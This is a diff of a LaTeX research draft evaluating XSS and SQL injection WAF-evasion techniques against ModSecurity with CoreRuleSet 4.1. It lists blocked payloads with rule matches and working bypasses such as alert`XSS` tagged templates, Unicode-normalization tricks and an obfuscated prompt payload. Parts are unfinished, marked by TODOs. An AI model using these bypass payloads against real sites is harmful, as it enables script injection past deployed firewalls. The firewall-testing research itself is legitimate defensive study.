@@ -26,7 +26,7 @@ will cause the request to be blocked by ModSecurity without matching on any Core
 <MatchedData>"Request body excluding files is bigger than the maximum expected."</MatchedData>
 \end{lstlisting}
 
-It takes exactly 131073 1-byte characters to reach this limit. If one less character is used in the request body, the ModSecurity firewall will match on \verb|alert(|, like in Listing~\ref{lst:alertXSSblocked}. This corresponds to the 131072 limit stated in the ModSecurity configuration file.
+It takes exactly 131073 1-byte characters to reach this limit. If one less character is used in the request body, the ModSecurity firewall will match on \verb|alert(|, like in Listing~\ref{lst:alertXSSblocked}. This corresponds to the 131072 limit with rejection by default on exceeding the limit stated in the ModSecurity configuration file.
 
 
 \subsubsection{Unicode in JSON}
@@ -67,7 +67,7 @@ If the opening \verb|(| is substituted with the "Superscript Left Parenthesis" (
 \end{lstlisting}
 
 Calling \verb|.normalize('NFKD')| on the bypassed string:\\ 
-\verb|"alert\u{207D}'normalizeMe')".normalize('NFKD')| will convert the string to the original payload: \verb|"alert('normalizeMe')"|.
+\verb|"alert\u{207D}'normalizeMe')".normalize('NFKD')| will convert the string to the original payload: \verb|"alert('normalizeMe')"|. As such, this payload would be a valid bypass on web applications that normalize payloads on incoming requests using the NFKD or another normalization algorith that normalizes the payload equally. 
 
 
 \subsubsection{Case Alternation}
@@ -90,34 +90,35 @@ The \verb|(?i)| regex modifier at the beginning of the rule instructs the regex 
 
 
 \subsubsection{Comment Interference}
-The example given by Ally Petitt \cite{medium/allypetitt} in Section~\ref{sec:commint} has been tested against the ModSecurity Firewall using CRS4.1. The original payload: \verb|?id=1+union+select+1,2,3--| is being blocked by the firewall:
-
-\begin{lstlisting}[style=ruleStyle, language=XML, caption=union select injection blocked, label=lst:sqliblocked]
-<payload>?id=1+union+select+1,2,3--</payload>
-
-<file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
-<fileDetails>[line "205"] [id "942190"]<fileDetails>
-<MatchedData>"union select"</MatchedData>
-<message>"Detects MSSQL code execution and information gathering attempts"</message>
-
-<file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
-<fileDetails>[line "469"] [id "942360"]<fileDetails>
-<MatchedData>"1 union select"</MatchedData>
-<message>"Detects concatenated basic SQL injection and SQLLFI attempts"</message>
-\end{lstlisting}
-
-Similarly, the modified payload using Comment Interference: \verb|?id=1+un/**/ion+sel/**/ect+1,2,3--| is detected and blocked:
-
-\begin{lstlisting}[style=ruleStyle, language=XML, caption=Comment Interference in SQL blocked, label=lst:commentinterferenceinsqlblocked]
-<payload>?id=1+un/**/ion+sel/**/ect+1,2,3--</payload>
-<file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
-<fileDetails>[line "205"] [id "942190"]<fileDetails>
-<MatchedData>"union select"</MatchedData>
-<message>"Detects MSSQL code execution and information gathering attempts"</message>
-\end{lstlisting}
-
-The fact that the ModSecurity Firewall using CRS4.1 blocks this specifically crafted payload does not proof that using Comment Interference will never make payloads bypass the firewall. No more research was conducted into this idea, therefore Comment Interference is not being considered when crafting bypassing payloads in multiple steps in the following section.
-
+{\color{red}TODO XSS comment interference}
+% The example given by Ally Petitt \cite{medium/allypetitt} in Section~\ref{sec:commint} has been tested against the ModSecurity Firewall using CRS4.1. The original payload: \verb|?id=1+union+select+1,2,3--| is being blocked by the firewall:
+%
+% \begin{lstlisting}[style=ruleStyle, language=XML, caption=union select injection blocked, label=lst:sqliblocked]
+% <payload>?id=1+union+select+1,2,3--</payload>
+%
+% <file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
+% <fileDetails>[line "205"] [id "942190"]<fileDetails>
+% <MatchedData>"union select"</MatchedData>
+% <message>"Detects MSSQL code execution and information gathering attempts"</message>
+%
+% <file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
+% <fileDetails>[line "469"] [id "942360"]<fileDetails>
+% <MatchedData>"1 union select"</MatchedData>
+% <message>"Detects concatenated basic SQL injection and SQLLFI attempts"</message>
+% \end{lstlisting}
+%
+% Similarly, the modified payload using Comment Interference: \verb|?id=1+un/**/ion+sel/**/ect+1,2,3--| is detected and blocked:
+%
+% \begin{lstlisting}[style=ruleStyle, language=XML, caption=Comment Interference in SQL blocked, label=lst:commentinterferenceinsqlblocked]
+% <payload>?id=1+un/**/ion+sel/**/ect+1,2,3--</payload>
+% <file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
+% <fileDetails>[line "205"] [id "942190"]<fileDetails>
+% <MatchedData>"union select"</MatchedData>
+% <message>"Detects MSSQL code execution and information gathering attempts"</message>
+% \end{lstlisting}
+%
+% The fact that the ModSecurity Firewall using CRS4.1 blocks this specifically crafted payload does not proof that using Comment Interference will never make payloads bypass the firewall. No more research was conducted into this idea, therefore Comment Interference is not being considered when crafting bypassing payloads in multiple steps in the following section.
+%
 
 \subsubsection{Percent Encoding}
 The ModSecurity firewall detects some percent-encoded payloads. Requests with plain as well as percent-encoded payloads were sent to the reverse proxy. All requests triggered the same rules:
@@ -137,18 +138,20 @@ The ModSecurity firewall detects some percent-encoded payloads. Requests with pl
 <MatchedData>"alert("</MatchedData>
 \end{lstlisting}
 
+Many rules that are delivered as part of the CoreRuleSet in version 4.1 use the \verb|t:urlDecode| or \verb|t:urlDecodeUni| transformations that transform a filtered request by url decoding input strings before checking for rule matches. Therefore, using percent (url) encoding to try and bypass a firewall equipped with rules from CRS4.1 is considered futile.
+
 
 \subsubsection{Charset Alternation}
+{\color{red}TODO }
 
 \subsubsection{Function Constructor}
 \label{sec:functionconstructorsingleeva}
-TODO
-also: mention global objects here \cite{js/builtin}
+{\color{red}TODO also: mention global objects here \cite{js/builtin}}
 
 \subsubsection{Tagged Template Literals}
 \label{sec:taggedtemplateliteralsevaluation}
 As stated in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked by the tested firewall.
-After substituting the function call using \verb|('XSS')| with a Tagged Template Literal in the form of \verb|alert`XSS`|, the payload successfully bypasses the firewall and reaches the web server. (Listing~\ref{lst:alertXSSbypass})
+After substituting the function call using \verb|('XSS')| with a Tagged Template Literal in the form of \verb|alert`XSS`|, the payload successfully bypasses the firewall and reaches the web server: 
 
 \begin{lstlisting}[style=ruleStyle, language=XML, caption=alert`XSS` bypass, label=lst:alertXSSbypass]
 <payload>alert("XSS")</payload>
@@ -156,6 +159,25 @@ After substituting the function call using \verb|('XSS')| with a Tagged Template
 \end{lstlisting}
 
 {\color{red} hier evtl noch etwas mehr...}
+
+\subsubsection{eval() function}
+The ModSecurity firewall using CRS 4.1.0. checks for usage of the function \verb|eval()| and tries to block requests containing it. An example is listed in Listing~\ref{lst:evalalertXSSblocked}.
+{\color{red} hier evtl noch etwas mehr...}
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=eval(`al` + `e` + `rt('XSS')`) blocking example, label={lst:evalalertXSSblocked}]
+<payload>eval(`al` + `e` + `rt('XSS')`)</payload>
+<file>"rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"</file>
+<fileDetails>[line "331"] [id "933160"]<fileDetails>
+<MatchedData>"eval(`al`   `e`   `rt('XSS')"</MatchedData>
+
+<file>"rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
+<fileDetails>[line "52"] [id "934100"]<fileDetails>
+<MatchedData>"eval("</MatchedData>
+
+<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "714"] [id "941390"]<fileDetails>
+<MatchedData>"eval("</MatchedData>
+\end{lstlisting}
 
 \subsubsection{JSFuck}
 The payload \verb|alert('XSS')| has been sent to the Web Application and blocked (Listing~\ref{lst:alertXSSblocked}). Subsequently the payload was obscured using the service provided by JSFuck: https://jsfuck.com/ \\
@@ -190,5 +212,9 @@ If the Aurebesh technique is used to substitute most of the payload with the cha
 <payload>prompt(1,2)</payload>
 <bypass>A='',B=!A+A,C=!B+A,D=A+{},E=B[A++],F=B[G=A],H=++G+A,I=D[G+H],B[I+=D[A]+(B.C+D)[A]+C[H]+E+F+B[G]+I+E+D[A]+F][I]('p'+F+D[A]+'m'+'p'+E+'(A,++A)')()</bypass>
 \end{lstlisting}
+
+For an explanation on how the payload mentioned in Listing~\ref{lst:aurebeshpromptbypass} was created, see Section~\ref{sec:aurebesh}.
+
+The aurebesh evaluation concludes the single iteration evaluation. In the following subsection, payloads obscured through multiple iterations will be evaluated against the tested firewall configuration of an nginx reverse proxy using ModSecurity equipped with rules from the CoreRuleSet version 4.1.
 
 
